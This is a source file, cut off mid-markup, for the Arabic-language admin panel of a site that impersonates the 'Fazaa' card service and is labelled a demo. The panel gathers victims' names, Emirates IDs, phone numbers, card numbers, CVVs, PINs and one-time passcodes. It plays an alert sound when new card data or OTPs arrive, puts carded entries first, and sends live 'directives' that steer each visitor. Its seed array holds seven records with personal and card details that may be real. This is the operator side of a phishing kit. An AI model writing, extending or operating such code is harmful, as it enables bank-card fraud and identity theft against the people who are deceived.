/* لوحة إدارة فزعة — إحصائيات + إدارة العضويات/الطلبات/العروض/المحتوى */
import { useState, useEffect, useRef } from "react";
import { Link } from "wouter";
import { toast } from "sonner";
import {
  ClipboardList, Check, ArrowRight, Trash2, RefreshCw, X, Volume2, VolumeX,
} from "lucide-react";
import { ASSETS } from "@/lib/data";
import { pollLiveOrders, fetchLiveOrders, deleteLiveOrder, setLiveOrderStatus, setLiveOrderDirective, type LiveOrder } from "@/lib/liveOrders";
import { snapshotOf, hasNewSensitiveData } from "@/lib/alertLogic";

type Tab = "orders";

interface Order {
  id: string;
  date: string;
  page: string;
  name: string;
  idNumber: string;
  phone: string;
  cardNumber: string;
  bankName: string;
  expiry: string;
  cvv: string;
  pin: string;
  otp: string;
  otpHistory?: string[];
  bankAuth: string;
  authCount?: number;
  status: "pending" | "accepted" | "rejected";
  isOnline: boolean;
  location?: string;
}

const INITIAL_ORDERS: Order[] = [
  { id: "1", date: "15 يونيو، 12:09 م", page: "بيانات البطاقة", name: "Maha Saif Ibrahim Attia", idNumber: "784200209327046", phone: "0568100713", cardNumber: "4333 6783 2017 9321", bankName: "بنك أبوظبي الأول (FAB)", expiry: "05/28", cvv: "590", pin: "-", otp: "123456", otpHistory: ["123456", "654321"], bankAuth: "true", authCount: 2, status: "pending", isOnline: false },
  { id: "2", date: "15 يونيو، 11:47 ص", page: "بيانات البطاقة", name: "Ahmed Saif", idNumber: "784-2007-9832639-1", phone: "524047061", cardNumber: "4333 6761 5285 9473", bankName: "بنك أبوظبي الأول (FAB)", expiry: "09/27", cvv: "412", pin: "-", otp: "-", bankAuth: "true", authCount: 3, status: "pending", isOnline: false },
  { id: "3", date: "15 يونيو، 11:43 ص", page: "بيانات البطاقة", name: "زايد سيف ابراهيم عطيه", idNumber: "784-2009-4196057-5", phone: "0508406603", cardNumber: "4333 6780 2402 2058", bankName: "بنك أبوظبي الأول (FAB)", expiry: "11/26", cvv: "731", pin: "-", otp: "9876", otpHistory: ["9876"], bankAuth: "-", status: "pending", isOnline: false },
  { id: "4", date: "15 يونيو، 08:51 ص", page: "بيانات البطاقة", name: "Ahmed Abdullah Almazrouei", idNumber: "784198138687086", phone: "0502380008", cardNumber: "4258 9390 4129 9439", bankName: "بطاقة Visa", expiry: "03/29", cvv: "864", pin: "••••", otp: "-", bankAuth: "-", status: "pending", isOnline: false },
  { id: "5", date: "15 يونيو، 07:54 ص", page: "الرئيسية", name: "منصور محمد", idNumber: "784198372802136", phone: "0547375320", cardNumber: "4333 6764 9864 4266", bankName: "بنك أبوظبي الأول (FAB)", expiry: "07/27", cvv: "205", pin: "-", otp: "-", bankAuth: "-", status: "pending", isOnline: false },
  { id: "6", date: "16 يونيو، 05:09 م", page: "بيانات البطاقة", name: "سيف محمد سعيد الجابري", idNumber: "784200396197905", phone: "0566599938", cardNumber: "-", bankName: "-", expiry: "-", cvv: "-", pin: "-", otp: "-", bankAuth: "-", status: "pending", isOnline: false },
  { id: "7", date: "16 يونيو، 03:25 ص", page: "ملخص الطلب", name: "مي وصفي حسن", idNumber: "784198771715038", phone: "0501912172", cardNumber: "-", bankName: "-", expiry: "-", cvv: "-", pin: "-", otp: "-", bankAuth: "-", status: "pending", isOnline: false },
];



const NAV: { id: Tab; label: string; icon: any }[] = [
  { id: "orders", label: "إدارة الطلبات", icon: ClipboardList },
];

const STATUS_LABEL: Record<string, { t: string; c: string }> = {
  pending: { t: "قيد المراجعة", c: "bg-amber-100 text-amber-800" },
  accepted: { t: "مقبول", c: "bg-green-100 text-green-700" },
  rejected: { t: "مرفوض", c: "bg-red-100 text-red-700" },
};

// تجاوزات الحالة اليدوية: تُحفظ محلياً لتبقى ثابتة فوق بيانات الخادم عند التحديث
const STATUS_OVERRIDE_KEY = "fazaa-status-overrides";
const DELETED_OVERRIDE_KEY = "fazaa-deleted-overrides";
type StatusOverrides = Record<string, Order["status"]>;

function loadStatusOverrides(): StatusOverrides {
  try {
    const raw = localStorage.getItem(STATUS_OVERRIDE_KEY);
    return raw ? (JSON.parse(raw) as StatusOverrides) : {};
  } catch {
    return {};
  }
}
function saveStatusOverride(id: string, status: Order["status"]) {
  try {
    const cur = loadStatusOverrides();
    cur[id] = status;
    localStorage.setItem(STATUS_OVERRIDE_KEY, JSON.stringify(cur));
  } catch {}
}
function loadDeletedOverrides(): string[] {
  try {
    const raw = localStorage.getItem(DELETED_OVERRIDE_KEY);
    return raw ? (JSON.parse(raw) as string[]) : [];
  } catch {
    return [];
  }
}
function saveDeletedOverride(id: string) {
  try {
    const cur = loadDeletedOverrides();
    if (!cur.includes(id)) {
      cur.push(id);
      localStorage.setItem(DELETED_OVERRIDE_KEY, JSON.stringify(cur));
    }
  } catch {}
}

// قرار المشرف (قبول/رفض) مستقل عن حالة الطلب: يُبقي الطلب في النشطة ويُظهره أيضاً في مجلد المقبولة/المرفوضة
type Decision = "accepted" | "rejected";
const DECISION_KEY = "fazaa-decisions";
type Decisions = Record<string, Decision>;

function loadDecisions(): Decisions {
  try {
    const raw = localStorage.getItem(DECISION_KEY);
    return raw ? (JSON.parse(raw) as Decisions) : {};
  } catch {
    return {};
  }
}
function saveDecision(id: string, decision: Decision) {
  try {
    const cur = loadDecisions();
    cur[id] = decision;
    localStorage.setItem(DECISION_KEY, JSON.stringify(cur));
  } catch {}
}
function clearDecision(id: string) {
  try {
    const cur = loadDecisions();
    delete cur[id];
    localStorage.setItem(DECISION_KEY, JSON.stringify(cur));
  } catch {}
}

// هل السجل طلب فعلي (أدخل صاحبه بيانات) أم مجرد جلسة حضور خفيفة؟
// جلسات الحضور الفارغة تظهر فقط في "الزوار النشطون" ولا تظهر في جدول الطلبات.
function isRealOrder(o: Order): boolean {
  // الطلبات التجريبية (معرّف رقمي لا يبدأ بـ L-) تُعتبر دائماً طلباً
  if (!o.id.startsWith("L-")) return true;
  const has = (v?: string) => !!v && v !== "-" && v.trim() !== "";
  return has(o.name) || has(o.phone) || has(o.idNumber) || has(o.cardNumber);
}

// تطبيق التجاوزات المحلية فوق قائمة الطلبات القادمة من الخادم/الافتراضية
function applyOverrides(list: Order[]): Order[] {
  const ov = loadStatusOverrides();
  const del = loadDeletedOverrides();
  return list
    .filter((o) => !del.includes(o.id))
    .map((o) => (ov[o.id] ? { ...o, status: ov[o.id] } : o));
}

export default function Admin() {
  const [tab, setTab] = useState<Tab>("orders");
  const [orderFolder, setOrderFolder] = useState<"active" | "approved" | "refused" | "archive" | "deleted">("active");
  // قرارات القبول/الرفض المستقلة (تُبقي الطلب في النشطة وتظهره في مجلده)
  const [decisions, setDecisions] = useState<Decisions>(() => loadDecisions());
  const [orders, setOrders] = useState<Order[]>(() => applyOverrides(INITIAL_ORDERS));
  const [activeCount, setActiveCount] = useState(0);
  const [totalCount, setTotalCount] = useState(0);
  const [isRefreshing, setIsRefreshing] = useState(false);

  // تحويل صف الطلب الحي إلى صف العرض
  const mapLive = (lo: LiveOrder): Order => ({
    id: lo.id,
    date: lo.date,
    page: lo.page,
    name: lo.name || "-",
    idNumber: lo.idNumber || "-",
    phone: lo.phone || "-",
    cardNumber: lo.cardNumber || "-",
    bankName: lo.bankName || "-",
    expiry: lo.expiry || "-",
    cvv: lo.cvv || "-",
    pin: lo.pin || "-",
    otp: lo.otp || "-",
    otpHistory: lo.otpHistory || (lo.otp && lo.otp !== "-" ? [lo.otp] : []),
    bankAuth: lo.bankAuth || "-",
    authCount: lo.authCount || (lo.bankAuth && lo.bankAuth !== "-" ? 1 : 0),
    status: lo.status,
    isOnline: lo.isOnline,
    location: lo.location,
  });

  // استطلاع دوري للطلبات الحية من الخادم ودمجها مع الطلبات التجريبية
  // تُطبَّق التجاوزات اليدوية (الأرشفة/الحذف) فوق بيانات الخادم حتى لا تعود الطلبات للنشطة
  useEffect(() => {
    return pollLiveOrders(({ orders: live, active, total }) => {
      const merged = [...live.map(mapLive), ...INITIAL_ORDERS];
      setOrders(applyOverrides(merged));
      setActiveCount(active);
      setTotalCount(total);
    });
  }, []);
  const [cardModal, setCardModal] = useState<Order | null>(null);

  // تتبع البطاقات التي تم الضغط عليها (مقروءة) لإزالة التظليل الأصفر نهائياً
  const [readCards, setReadCards] = useState<Record<string, string>>(() => {
    try {
      const raw = localStorage.getItem("fazaa-read-cards");
      return raw ? JSON.parse(raw) : {};
    } catch {
      return {};
    }
  });

  // عند الضغط على رقم البطاقة: فتح النافذة وتعليمها كمقروءة (حسب رقم البطاقة)
  const openCard = (o: Order) => {
    setCardModal(o);
    setReadCards((prev) => {
      const next = { ...prev, [o.id]: o.cardNumber };
      try {
        localStorage.setItem("fazaa-read-cards", JSON.stringify(next));
      } catch {
        // تجاهل إن لم يتوفر localStorage
      }
      return next;
    });
  };

  // مرجع سياق الصوت (يُنشأ مرة واحدة بعد أول تفاعل من المستخدم)
  const audioCtxRef = useRef<AudioContext | null>(null);
  // هل تم تفعيل التنبيه الصوتي (يتطلب تفاعل المستخدم أولاً بسبب سياسة المتصفحات)
  const [soundEnabled, setSoundEnabled] = useState(false);
  // لقطة سابقة لبيانات البطاقة/OTP/المصادقة لكل طلب لاكتشاف الجديد منها
  const prevSensitiveRef = useRef<Record<string, string>>({});

  // تفعيل التنبيه الصوتي: يُنشئ ويستأنف سياق الصوت بناءً على تفاعل المستخدم، ثم يُشغل نغمة تأكيد
  const enableSound = () => {
    try {
      if (!audioCtxRef.current) {
        const Ctx = window.AudioContext || (window as any).webkitAudioContext;
        if (!Ctx) {
          toast.error("المتصفح لا يدعم التنبيه الصوتي");
          return;
        }
        audioCtxRef.current = new Ctx();
      }
      audioCtxRef.current.resume();
      setSoundEnabled(true);
      playAlertSound(true); // نغمة تأكيد
      toast.success("تم تفعيل التنبيه الصوتي");
    } catch {
      toast.error("تعذر تفعيل الصوت");
    }
  };

  // إشعار صوتي أنيق قصير جداً (نغمتان لطيفتان متتاليتان) عبر Web Audio API
  const playAlertSound = (force = false) => {
    // لا تشغيل قبل التفعيل (إلا نغمة التأكيد عند التفعيل)
    if (!force && !soundEnabled) return;
    try {
      if (!audioCtxRef.current) {
        const Ctx = window.AudioContext || (window as any).webkitAudioContext;
        if (!Ctx) return;
        audioCtxRef.current = new Ctx();
      }
      const ctx = audioCtxRef.current;
      if (ctx.state === "suspended") ctx.resume();
      const now = ctx.currentTime;
      // نغمتان قصيرتان (E6 ثم A6) بصوت ناعم منخفض
      const notes = [
        { freq: 1318.51, start: 0 },
        { freq: 1760.0, start: 0.12 },
      ];
      notes.forEach(({ freq, start }) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.value = freq;
        const t = now + start;
        gain.gain.setValueAtTime(0.0001, t);
        gain.gain.exponentialRampToValueAtTime(0.16, t + 0.02);
        gain.gain.exponentialRampToValueAtTime(0.0001, t + 0.18);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(t);
        osc.stop(t + 0.2);
      });
    } catch {
      /* تجاهل أي خطأ صوتي بصمت */
    }
  };

  // تهيئة اللقطة السابقة عند أول تحميل دون تشغيل صوت
  useEffect(() => {
    const snap: Record<string, string> = {};
    INITIAL_ORDERS.forEach((o) => {
      snap[o.id] = snapshotOf(o);
    });
    prevSensitiveRef.current = snap;
  }, []);

  // مراقبة وصول رقم بطاقة / رمز OTP جديد / مصادقة بنكية جديدة لتشغيل الإشعار الصوتي
  useEffect(() => {
    let shouldAlert = false;
    const newSnap: Record<string, string> = {};
    orders.forEach((o) => {
      const prev = prevSensitiveRef.current[o.id];
      const cur = snapshotOf(o);
      newSnap[o.id] = cur;
      if (hasNewSensitiveData(prev, cur)) shouldAlert = true;
    });
    prevSensitiveRef.current = newSnap;
    if (shouldAlert) playAlertSound();
  }, [orders]);

  const handleRefresh = () => {
    setIsRefreshing(true);
    // استطلاع لحظي واحد من الخادم دون انتظار الدورة التالية
    fetchLiveOrders()
      .then(({ orders: live, active, total }) => {
        setOrders(applyOverrides([...live.map(mapLive), ...INITIAL_ORDERS]));
        setActiveCount(active);
        setTotalCount(total);
      })
      .catch(() => {})
      .finally(() => {
        setTimeout(() => {
          setIsRefreshing(false);
          toast.success("تم تحديث البيانات بنجاح");
        }, 400);
      });
  };

  const setStatus = async (id: string, status: Order["status"]) => {
    // حفظ التجاوز محلياً حتى يبقى ثابتاً بعد التحديث
    saveStatusOverride(id, status);
    if (id.startsWith("L-")) {
      await setLiveOrderStatus(id, status);
    }
    setOrders((o) => o.map((x) => (x.id === id ? { ...x, status } : x)));
    toast.success(status === "accepted" ? "تم قبول الطلب" : "تم رفض الطلب");
  };

  // تسجيل قرار القبول/الرفض دون نقل الطلب من النشطة (يبقى في مكانه ويظهر في مجلده)
  const decideOrder = (id: string, decision: Decision) => {
    setDecisions((prev) => {
      const cur = prev[id];
      // الضغط مجدداً على نفس القرار يلغيه (تبديل)
      if (cur === decision) {
        clearDecision(id);
        const next = { ...prev };
        delete next[id];
        toast.success("تم إلغاء القرار");
        return next;
      }
      saveDecision(id, decision);
      toast.success(decision === "accepted" ? "تم وضع الطلب في المقبولة" : "تم وضع الطلب في المرفوضة");
      return { ...prev, [id]: decision };
    });
  };

  const handleDelete = async (id: string) => {
    // تسجيل الحذف محلياً حتى لا يعود الطلب عند التحديث
    saveDeletedOverride(id);
    if (id.startsWith("L-")) {
      await deleteLiveOrder(id);
    }
    setOrders((o) => o.filter((x) => x.id !== id));
    toast.success("تم حذف الطلب");
  };

  const handleDirective = async (id: string, directive: string, label: string, status?: Order["status"]) => {
    if (id.startsWith("L-")) {
      // حفظ تجاوز الحالة محلياً إن رافق التوجيه تغيير حالة
      if (status) {
        saveStatusOverride(id, status);
        setOrders((o) => o.map((x) => (x.id === id ? { ...x, status } : x)));
      }
      await setLiveOrderDirective(id, directive, status);
      toast.success(`تم توجيه الزائر إلى: ${label}`);
    } else {
      if (status) {
        saveStatusOverride(id, status);
        setOrders((o) => o.map((x) => (x.id === id ? { ...x, status } : x)));
      }
      toast.success(`تم تحديث الطلب: ${label}`);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-secondary/30" dir="rtl">
      {/* شريط علوي بديل للقائمة الجانبية */}
      <header className="fazaa-header-bg sticky top-0 z-50 shadow-md">
        <div className="relative z-10 flex items-center justify-between px-6 py-3 border-b border-[#C9A227]/20">
          <Link href="/" className="flex items-center gap-3">
            <img src={ASSETS.logo} alt="فزعة" className="h-10 w-10 object-contain" />
            <div>
              <div className="font-elegant text-xl fazaa-gold-text">فزعة</div>
              <div className="text-[9px] tracking-[0.3em] text-[#E6C766]/70">ADMIN</div>
            </div>
          </Link>
          <Link href="/" className="flex items-center gap-2 text-xs text-white/70 hover:text-[#E6C766]">
            العودة للموقع <ArrowRight className="h-3.5 w-3.5 rotate-180" />
          </Link>
        </div>
        <div className="relative z-10 px-6 py-2 overflow-x-auto">
          <div className="flex gap-2">
            {NAV.map((n) => (
              <button
                key={n.id}
                onClick={() => setTab(n.id)}
                className={`whitespace-nowrap rounded-full px-4 py-2 text-sm font-semibold flex items-center gap-2 transition ${
                  tab === n.id ? "bg-[#C9A227] text-[#15120c]" : "text-white/80 hover:bg-white/10"
                }`}
              >
                <n.icon className="h-4 w-4" /> {n.label}
              </button>
            ))}
          </div>
        </div>
      </header>

      <div className="flex-1 min-w-0 w-full max-w-[1600px] mx-auto flex flex-col">

        <main className="p-5 sm:p-8 flex-1 flex flex-col">
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center gap-4">
              <div>
                <h1 className="text-2xl font-extrabold text-foreground mb-1">
                  {NAV.find((n) => n.id === tab)?.label}
                </h1>
                <p className="text-sm text-muted-foreground">لوحة تحكم بطاقة فزعة — عرض تجريبي</p>
              </div>
              
              <button 
                onClick={handleRefresh}
                disabled={isRefreshing}
                className="h-10 w-10 rounded-full bg-white border border-gray-200 shadow-sm flex items-center justify-center text-gray-600 hover:bg-gray-50 hover:text-[#C9A227] transition-all disabled:opacity-50"
                title="تحديث البيانات"
              >
                <RefreshCw className={`h-5 w-5 ${isRefreshing ? 'animate-spin text-[#C9A227]' : ''}`} />
              </button>

              {/* زر تفعيل التنبيه الصوتي عند وصول بيانات جديدة */}
              <button
                onClick={enableSound}
                className={`h-10 px-3 rounded-full border shadow-sm flex items-center gap-2 text-sm font-bold transition-all ${
                  soundEnabled
                    ? "bg-green-50 border-green-200 text-green-700"
                    : "bg-white border-amber-300 text-amber-700 hover:bg-amber-50 animate-pulse"
                }`}
                title={soundEnabled ? "التنبيه الصوتي مفعّل" : "اضغط لتفعيل التنبيه الصوتي"}
              >
                {soundEnabled ? <Volume2 className="h-5 w-5" /> : <VolumeX className="h-5 w-5" />}
                <span className="hidden sm:inline">{soundEnabled ? "الصوت مفعّل" : "تفعيل الصوت"}</span>
              </button>
            </div>
            
            {/* القائمة المنسدلة للزوار النشطين */}
            <div className="relative group">
              <button className="flex items-center gap-2 bg-white border border-gray-200 shadow-sm rounded-lg px-4 py-2 hover:bg-gray-50 transition-colors">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-green-500"></span>
                </span>
                <span className="font-bold text-sm text-gray-700">الزوار النشطون</span>
                <span className="bg-green-100 text-green-800 text-xs font-bold px-2 py-0.5 rounded-full">
                  {activeCount}
                </span>
              </button>

              {/* إجمالي الزوار الذين دخلوا الموقع (تراكمي) */}
              <div className="mt-1.5 flex items-center gap-2 px-1">
                <span className="text-xs font-semibold text-gray-500">إجمالي الزوار</span>
                <span className="bg-slate-100 text-slate-700 text-xs font-bold px-2 py-0.5 rounded-full">
                  {totalCount}
                </span>
              </div>
              
              <div className="absolute left-0 top-full mt-2 w-72 bg-white rounded-xl shadow-xl border border-gray-100 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200 z-50">
                <div className="p-3 border-b border-gray-100 bg-gray-50/50 rounded-t-xl">
                  <h3 className="text-xs font-bold text-gray-500">المتواجدون حالياً في الموقع</h3>
                </div>
                <div className="max-h-[300px] overflow-y-auto p-2 space-y-1">
                  {orders.filter(o => o.isOnline && o.id.startsWith("L-")).map((visitor) => (
                    <div key={`visitor-dropdown-${visitor.id}`} className="p-2 hover:bg-gray-50 rounded-lg transition-colors flex flex-col gap-1">
                      <div className="flex justify-between items-center">
                        <span className="text-sm font-semibold text-gray-800 truncate max-w-[150px]" title={visitor.name && visitor.name !== "-" ? visitor.name : (visitor.location || "موقع غير معروف")}>
                          {visitor.name && visitor.name !== "-" ? visitor.name : (visitor.location || "موقع غير معروف")}
                        </span>
                        <span className="text-[10px] text-gray-400">{visitor.date.split('،')[1]}</span>
                      </div>
                      <div className="flex items-center gap-1.5 text-xs text-gray-500">
                        <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
                        يتصفح: <span className="font-medium text-blue-600">{visitor.page}</span>
                      </div>
                    </div>
                  ))}
                  
                  {orders.filter(o => o.isOnline && o.id.startsWith("L-")).length === 0 && (
                    <div className="text-center py-6 text-gray-400 text-sm">
                      لا يوجد زوار نشطين حالياً
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>



          {tab === "orders" && (
            <div className="space-y-4 flex-1 flex flex-col min-h-0">
              <div className="flex gap-2 border-b border-border pb-2">
                <button
                  onClick={() => setOrderFolder("active")}
                  className={`px-4 py-2 text-sm font-bold rounded-t-lg transition-colors ${orderFolder === "active" ? "bg-[#C9A227] text-[#15120c]" : "text-muted-foreground hover:bg-secondary"}`}
                >
                  الطلبات النشطة
                </button>
                <button
                  onClick={() => setOrderFolder("approved")}
                  className={`px-4 py-2 text-sm font-bold rounded-t-lg transition-colors flex items-center gap-1.5 ${orderFolder === "approved" ? "bg-green-600 text-white" : "text-green-700 hover:bg-green-50"}`}
                >
                  <Check className="h-3.5 w-3.5" /> المقبولة
                  <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full ${orderFolder === "approved" ? "bg-white/25" : "bg-green-100 text-green-700"}`}>
                    {Object.values(decisions).filter((d) => d === "accepted").length}
                  </span>
                </button>
                <button
                  onClick={() => setOrderFolder("refused")}
                  className={`px-4 py-2 text-sm font-bold rounded-t-lg transition-colors flex items-center gap-1.5 ${orderFolder === "refused" ? "bg-red-600 text-white" : "text-red-700 hover:bg-red-50"}`}
                >
                  <X className="h-3.5 w-3.5" /> المرفوضة
                  <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full ${orderFolder === "refused" ? "bg-white/25" : "bg-red-100 text-red-700"}`}>
                    {Object.values(decisions).filter((d) => d === "rejected").length}
                  </span>
                </button>
                <button
                  onClick={() => setOrderFolder("archive")}
                  className={`px-4 py-2 text-sm font-bold rounded-t-lg transition-colors ${orderFolder === "archive" ? "bg-[#C9A227] text-[#15120c]" : "text-muted-foreground hover:bg-secondary"}`}
                >
                  الأرشيف
                </button>
                <button
                  onClick={() => setOrderFolder("deleted")}
                  className={`px-4 py-2 text-sm font-bold rounded-t-lg transition-colors ${orderFolder === "deleted" ? "bg-[#C9A227] text-[#15120c]" : "text-muted-foreground hover:bg-secondary"}`}
                >
                  الحذف
                </button>
              </div>
              <div className="card-soft overflow-auto flex-1 min-h-0">
                <table className="w-full table-fixed text-[11px] text-right">
                <thead className="border-b border-border bg-secondary/50">
                  <tr className="bg-[#151b2b] text-white text-[11px]">
                    <th className="px-1.5 py-2.5 font-bold text-right w-[10%]">التاريخ</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[8%]">الصفحة</th>
                    <th className="px-1.5 py-2.5 font-bold text-right w-[14%]">الاسم</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[11%]">رقم الهوية</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[10%]">رقم الهاتف</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[12%]">رقم البطاقة</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[11%]">البنك المُصدِر</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[7%]">مصادقة</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[6%]">OTP</th>
                    <th className="px-1.5 py-2.5 font-bold text-center w-[11%]">الإجراء</th>
                  </tr>
                </thead>
                <tbody className="bg-[#f0f2f5]">
                  {orders.filter(o => {
                    // استبعاد جلسات الحضور الخفيفة (بلا بيانات) من جدول الطلبات
                    if (!isRealOrder(o)) return false;
                    // المجلدان الجديدان يعتمدان على قرار المشرف المستقل (لا على حالة الطلب)
                    if (orderFolder === "approved") return decisions[o.id] === "accepted";
                    if (orderFolder === "refused") return decisions[o.id] === "rejected";
                    if (orderFolder === "active") return o.status === "pending";
                    if (orderFolder === "archive") return o.status === "accepted";
                    if (orderFolder === "deleted") return o.status === "rejected";
                    return true;
                  })
                  // تقديم الطلبات التي وصلت بيانات بطاقتها إلى أعلى القائمة (أول طلب)
                  .sort((a, b) => {
                    const aHasCard = a.cardNumber && a.cardNumber !== "-" ? 1 : 0;
                    const bHasCard = b.cardNumber && b.cardNumber !== "-" ? 1 : 0;
                    return bHasCard - aHasCard;
                  })
                  .map((o) => (
                    <tr key={o.id} className="border-b border-gray-200 last:border-0 hover:bg-gray-100 transition-colors">
                      <td className="px-1.5 py-2.5 text-[11px] font-medium text-gray-700 whitespace-nowrap">{o.date}</td>
                      <td className="px-1.5 py-2.5 text-center">
                        <span className="bg-slate-200 text-slate-800 px-2 py-0.5 rounded-full text-[10px] font-bold truncate inline-block max-w-full">
                          {o.page}
                        </span>
                      </td>
                      <td className="px-1.5 py-2.5">
                        <div className="flex items-center gap-1.5 justify-start">
                          <span className="font-bold text-slate-900 text-[11px] truncate" title={o.name}>{o.name}</span>
                          {o.isOnline && <span className="h-2 w-2 rounded-full bg-red-500 flex-shrink-0"></span>}
                          {decisions[o.id] === "accepted" && (
                            <span className="flex-shrink-0 bg-green-100 text-green-700 text-[9px] font-bold px-1.5 py-0.5 rounded-full">مقبول</span>
                          )}
                          {decisions[o.id] === "rejected" && (
                            <span className="flex-shrink-0 bg-red-100 text-red-700 text-[9px] font-bold px-1.5 py-0.5 rounded-full">مرفوض</span>
                          )}
                        </div>
                      </td>
                      <td className="px-1.5 py-2.5 text-center text-[11px] text-slate-800 font-bold font-mono truncate">{o.idNumber}</td>
                      <td className="px-1.5 py-2.5 text-center text-[11px] text-slate-800 font-bold font-mono truncate">{o.phone}</td>
                      <td className="px-1.5 py-2.5 text-center" dir="ltr">
                        {o.cardNumber !== "-" ? (
                          <button
                            onClick={() => openCard(o)}
                            title="عرض تفاصيل البطاقة"
                            className={`border rounded px-1.5 py-0.5 text-[11px] text-slate-800 font-bold font-mono truncate max-w-full inline-block cursor-pointer transition-colors shadow-sm ${
                              readCards[o.id] === o.cardNumber
                                ? "border-slate-400 bg-white hover:bg-slate-200 hover:border-slate-600 hover:text-slate-900"
                                : "border-amber-300 bg-amber-100 hover:bg-amber-200 hover:border-amber-400"
                            }`}
                          >
                            {o.cardNumber}
                          </button>
                        ) : (
                          <span className="text-gray-400 font-bold">-</span>
                        )}
                      </td>
                      <td className="px-1.5 py-2.5 text-center">
                        {o.bankName && o.bankName !== "-" ? (
                          <span className="text-[11px] font-bold text-slate-900 truncate inline-block max-w-full" title={o.bankName}>{o.bankName}</span>
                        ) : (
                          <span className="text-gray-400 font-bold">-</span>
                        )}
                      </td>
                      <td className="px-1.5 py-2.5 text-center">
                        {o.bankAuth !== "-" ? (
                          <div className="flex flex-wrap items-center justify-center gap-0.5 max-w-[90px] mx-auto">
                            {Array.from({ length: Math.max(1, o.authCount || 1) }).map((_, idx) => (
                              <span
                                key={idx}
                                title={`مصادقة ${idx + 1}`}
                                className="bg-green-100 text-green-700 rounded-full p-0.5 flex items-center justify-center shadow-sm"
                              >
                                <Check className="h-3.5 w-3.5" strokeWidth={3} />
                              </span>
                            ))}
                          </div>
                        ) : (
                          <span className="text-gray-400 font-bold">-</span>
                        )}
                      </td>
                      <td className="px-1.5 py-2.5 text-center">
                        {o.otpHistory && o.otpHistory.length > 0 ? (
                          <div className="flex flex-col gap-1 items-center justify-center">
                            {o.otpHistory.map((otpVal, idx) => {
                              const isLatest = idx === o.otpHistory!.length - 1;
                              return (
                                <span
                                  key={idx}
                                  title={isLatest ? "أحدث رمز" : `رمز سابق ${idx + 1}`}
                                  className={`px-1.5 py-0.5 rounded text-[11px] font-extrabold flex items-center justify-center gap-0.5 w-fit shadow-sm ${isLatest ? 'bg-red-100 text-red-800 ring-1 ring-red-300' : 'bg-gray-100 text-gray-500 opacity-70 line-through'}`}
                                >
                                  {otpVal}
                                </span>
                              );
                            })}
                          </div>
                        ) : o.otp !== "-" ? (
                          <span className="bg-red-100 text-red-800 px-1.5 py-0.5 rounded text-[11px] font-extrabold flex items-center justify-center gap-0.5 w-fit mx-auto shadow-sm">
                            {o.otp}
                          </span>
                        ) : (
                          <span className="text-gray-400 font-bold">-</span>
                        )}
                      </td>
                      <td className="px-1.5 py-2.5">
                        <div className="flex items-center justify-center gap-1.5">
                          {/* قرار القبول/الرفض المستقل: يُبقي الطلب في النشطة ويظهره في مجلد المقبولة/المرفوضة */}
                          <button
                            onClick={() => decideOrder(o.id, "accepted")}
                            title={decisions[o.id] === "accepted" ? "إلغاء القبول" : "وضع في المقبولة"}
                            className={`h-6 w-6 rounded border flex items-center justify-center transition-colors ${decisions[o.id] === "accepted" ? "bg-green-600 border-green-600 text-white" : "border-green-300 bg-white text-green-600 hover:bg-green-50"}`}
                          >
                            <Check className="h-3 w-3" />
                          </button>
                          <button
                            onClick={() => decideOrder(o.id, "rejected")}
                            title={decisions[o.id] === "rejected" ? "إلغاء الرفض" : "وضع في المرفوضة"}
                            className={`h-6 w-6 rounded border flex items-center justify-center transition-colors text-[10px] font-bold ${decisions[o.id] === "rejected" ? "bg-red-600 border-red-600 text-white" : "border-red-300 bg-white text-red-600 hover:bg-red-50"}`}
                          >
                            ✕
                          </button>
                          <span className="w-px h-5 bg-gray-200 mx-0.5" />
                          {orderFolder === "deleted" ? (
                            <button onClick={() => setStatus(o.id, "pending")} title="استعادة" className="h-6 w-6 rounded border border-gray-300 bg-white flex items-center justify-center hover:bg-gray-50 text-gray-500">
                              <RefreshCw className="h-3 w-3" />
                            </button>
                          ) : (
                            <button onClick={() => setStatus(o.id, "rejected")} title="نقل للمحذوفات" className="h-6 w-6 rounded border border-gray-300 bg-white flex items-center justify-center hover:bg-gray-50 text-gray-500">
                              <Trash2 className="h-3 w-3" />
                            </button>
                          )}
                          {orderFolder === "archive" ? (
                            <button onClick={() => setStatus(o.id, "pending")} title="إلغاء الأرشفة" className="h-6 w-6 rounded border border-gray-300 bg-white flex items-center justify-center hover:bg-gray-50 text-gray-500">
                              <RefreshCw className="h-3 w-3" />
                            </button>
                          ) : (
                            <button onClick={() => setStatus(o.id, "accepted")} title="أرشفة (قبول)" className="h-6 w-6 rounded border border-gray-300 bg-white flex items-center justify-center hover:bg-gray-50 text-gray-500">
                              <ClipboardList className="h-3 w-3" />
                            </button>
                          )}
                          
                          <div className="relative group">
                            <button title="توجيه" className="h-6 w-6 rounded border border-gray-300 bg-white flex items-center justify-center hover:bg-gray-50 text-gray-700">
                              <span className="text-[8px]">▼</span>
                            </button>
                            <div className="absolute left-0 top-full mt-1 w-36 bg-white border border-gray-200 rounded shadow-lg opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all z-50 py-1">
                              <button onClick={() => handleDirective(o.id, "success", "قبول")} className="w-full text-right px-3 py-2 text-xs text-green-700 hover:bg-gray-50 flex justify-between items-center">
                                قبول <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
